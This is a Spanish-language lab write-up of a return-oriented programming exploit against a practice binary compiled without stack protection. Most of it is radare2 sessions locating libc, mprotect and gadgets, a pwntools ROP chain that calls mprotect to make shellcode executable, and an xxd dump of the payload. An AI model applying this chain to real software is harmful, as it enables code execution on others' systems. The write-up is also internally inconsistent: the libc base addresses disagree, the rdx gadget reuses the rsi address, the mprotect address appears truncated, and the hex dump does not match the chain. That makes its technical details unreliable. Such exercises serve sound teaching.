MEMORIA ROP

# BINARIO VULNERABLE

Para realizar este ROP, se nos propone el uso de un .c (rop.c).

## COMPILACIÓN

Este archivo será compilado mediante:

gcc -o rop rop.c -fno-stack-protector

para evitar las protecciones de la pila

# ELEMENTOS IMPORTATES

Debemos tener en cuenta diferentes elementos de importancia dentro de este binario:

- Posición de la libc
	- Posición de la función mprotect
- Posición main
- Posición de nuestro shellcode

## BUSQUEDA DE ESTOS ELEMENTOS MEDIANTE R2

$ r2 -d rop
[0x7ffff7fd3090]> db main
[0x7ffff7fd3090]> dc
hit breakpoint at: 0x555555555149

[0x555555555135]> dm~libc
0x00007ffff7e00000 - 0x00007ffff7de0000 - usr   136K s r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so

[0x555555555135]> dmi libc mprotect~ mprotect$
1225 0x000f8c20  0x7fff7ef8c20  WEAK  FUNC  33		mprotect

[0x555555555135]> is shellcode
..
nth padrr      vaddr            bind     type     name    
59  0x00005040 0x55555555a040   GLOBAL   OBJ      newstack
60  0x00003040 0x555555558040   GLOBAL   OBJ      shellcode
...

### MPROTECT SINTAX
                    %RDI        %RSI        %RDX
       int mprotect(void *addr, size_t len, int prot);

addr = shellcode    //Shellcode address
len  = 0x1000        //Page Size 4KB
prot = 0x07         //PROT_READ + PROT_WRITE + PROT_EXEC = 0x7

# BUSQUEDA DE GADGETS ROP

Por tanto, necesitamos modificar los registros %rdi, %rsi, %rdx.

Utilizaremos r2 para la búsqueda de gadgets.

r2 /usr/lib/x86_64-linux-gnu/libc.so.6
[0x00026e40]> e asm.syntax=att
[0x00026e40]> e search.in=bin.sections.exec
[0x00026e40]> /Rq pop rdi | grep ret
...
0x001951a2: pop rdi; ret;
...
[0x00026e40]> /Rq pop rsi | grep ret
...
0x00196c65: pop rsi; ret;
...
[0x00026e40]> /Rq pop rdx | grep ret
...
0x00142c92: pop rdx; ret;
...

A estos gadgets, deberemos sumarle la base de la libc, puesto que se encuentran en ella 
y r2 únicamente nos ha devuelto el offset desde la base.

GADGETS OFFSET                  GADGETS ADDRESS

0x00196c65: pop rsi; ret;   ->  0x00007ffff7dbe000 + 0x00196c65 = 7ffff7f54c65
0x001951a2: pop rdi; ret;   ->  0x00007ffff7dbe000 + 0x001951a2 = 7ffff7f531a2
0x00142c92: pop rdx; ret;   ->  0x00007ffff7dbe000 + 0x00142c92 = 7ffff7f00c92

# ROP EXPLOIT

Para la creación del exploit, he utilizado python3 pwntools

La ROPChain creada es la siguiente:
		#pop rdi add		  #shellcode aligned page
chain = p64(0x00007ffff7f531a2) + p64(0x555555558000)

		#pop rsi add		  #page size
chain += p64(0x00007ffff7f54c65) + p64(0x1000)

		#pop rdx add		  #perms
chain += p64(0x00007ffff7f54c65) + p64(0x7)

		#mprotect add
chain += p64(0x00007fff7ef8c20)

		#shellcode address
chain += p64(0x555555558040)

No requerimos de buscar ningún gadget ret porque la función mprotect de la libc ya hace ret

# ROP SHELLCODE

Esta cadena la escribimos en un archivo "shellcode_exploit.txt"
f = open('shellcode_exploit.txt', 'wb')
f.write(chain)
print(chain)


Mediante xxd obtenemos el shellcode:

$ xxd -i shellcode_exploit.txt
unsigned char shellcode_exploit_txt[] = {
  0x75, 0xd2, 0xf6, 0xf7, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x80, 0x55, 0x55,
  0x55, 0x55, 0x00, 0x00, 0x39, 0x58, 0xf3, 0xf7, 0xff, 0x7f, 0x00, 0x00,
  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0xf7, 0xef, 0xf7,
  0xff, 0x7f, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x20, 0x8c, 0xef, 0xf7, 0xff, 0x7f, 0x00, 0x00, 0x40, 0x80, 0x55, 0x55,
  0x55, 0x55, 0x00, 0x00
};

El cual incrustaremos dentro de rop.c